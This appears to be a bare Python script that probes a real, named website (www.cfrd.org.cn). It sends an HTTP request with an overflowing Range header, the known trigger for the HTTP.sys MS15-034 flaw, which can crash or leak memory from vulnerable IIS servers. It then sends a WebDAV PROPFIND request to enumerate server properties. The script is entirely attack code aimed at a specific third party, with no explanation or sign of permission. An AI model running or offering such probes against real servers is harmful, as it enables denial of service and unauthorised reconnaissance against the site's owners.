import requests
 
headers = {
    'Range': 'bytes=0-18446744073709551615'
}
 
response = requests.get('https://www.cfrd.org.cn/', headers=headers)
print(response.status_code)
payload = "<?xml version=\"1.0\"?><propfind xmlns=\"DAV:\"><prop><propname/></prop></propfind>"
headers = {
    'Content-Length': str(len(payload)),
    'Content-Type': 'text/xml'
}
 
response = requests.request('PROPFIND', 'https://www.cfrd.org.cn/', headers=headers, data=payload)
print(response.status_code)



